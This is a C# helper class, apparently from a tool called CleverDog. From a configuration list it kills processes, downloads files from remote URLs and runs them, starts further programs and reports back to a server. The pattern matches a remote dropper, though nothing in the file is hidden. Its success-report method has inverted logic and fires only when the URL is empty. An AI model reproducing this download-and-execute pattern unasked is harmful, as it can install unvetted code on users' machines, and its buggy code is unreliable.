using Oreo.CleverDog.Commons;
using Oreo.CleverDog.Models;
using System;
using System.Collections.Generic;
using System.IO;
using System.Linq;
using System.Text;
using Y.Utils.AppUtils;
using Y.Utils.DataUtils.Collections;
using Y.Utils.DataUtils.EncryptUtils;
using Y.Utils.NetUtils.HttpUtils;
using Y.Utils.WindowsUtils.InfoUtils;
using Y.Utils.WindowsUtils.ProcessUtils;

namespace Oreo.CleverDog.Helpers
{
    public class FrisbeeHelper
    {
        public static void Fire()
        {
            // 加载配置信息
            if (ListTool.HasElements(Settings.Frisbee))
            {
                R.Log.i("任务配置加载成功 共" + Settings.Frisbee.Count() + " 条");
                // 循环所有任务
                foreach (var f in Settings.Frisbee)
                {
                    if (CanFire(f))//判断执行条件
                    {
                        R.Log.i("准备执行 " + f.FileName + " 的任务");

                        KillProcess(f);//结束进程
                        R.Log.i("结束进程完成");

                        if (DownFileAndRun(f))//下载程序并按需运行
                        {
                            R.Log.i("已下载 并按需运行");
                            RunProcess(f);//启动进程
                            R.Log.i("运行其他进程");
                            SuccUrl(f);//发送运行完信息
                            R.Log.i("发送运行信息至服务器");
                        }
                        else
                        {
                            R.Log.e("文件下载失败 任务被迫中止");
                        }
                    }
                    else
                    {
                        R.Log.e(f.FileName + " 任务不适应此计算机");
                    }
                }
            }
            else
            {
                R.Log.e("配置加载失败 任务失败");
            }
        }
        public static bool CanFire(Frisbee f)
        {
            // 验证有效时间
            if (DateTime.Now > f.Term)
                return false;

            // 验证系统
            if (f.Any3264 == "32" && Environment.Is64BitOperatingSystem)
                return false;
            if (f.Any3264 == "64" && !Environment.Is64BitOperatingSystem)
                return false;

            // 验证安装
            if (SoftwareTool.ExistFile(f.ExistFile) ||
                SoftwareTool.ExistProcess(f.ExistProcess) ||
                SoftwareTool.ExistControl(f.ExistControl))
            {
                return false;
            }
            return true;
        }
        public static bool DownFileAndRun(Frisbee f)
        {
            if (!string.IsNullOrWhiteSpace(f.Url) && !string.IsNullOrWhiteSpace(f.FileName))
            {
                string downfile = R.Paths.Frisbee + f.FileName;
                if (HttpTool.Download(f.Url, downfile))
                {
                    if (f.AutoRun && File.Exists(downfile))
                        ProcessTool.StartProcess(downfile);
                    return true;
                }
            }
            return false;
        }
        public static void KillProcess(Frisbee f)
        {
            if (!ListTool.IsNullOrEmpty(f.KillProcess))
            {
                foreach (var r in f.KillProcess)
                {
                    if (!string.IsNullOrWhiteSpace(r))
                    {
                        ProcessTool.KillProcess(r);
                    }
                }
            }
        }
        public static void RunProcess(Frisbee f)
        {
            if (!ListTool.IsNullOrEmpty(f.RunProcess))
            {
                foreach (var r in f.RunProcess)
                {
                    if (!string.IsNullOrWhiteSpace(r))
                    {
                        ProcessTool.StartProcess(r);
                    }
                }
            }
        }
        public static void SuccUrl(Frisbee f)
        {
            if (string.IsNullOrWhiteSpace(f.SuccUrl))
                HttpTool.Get(f.SuccUrl);
        }
    }
}
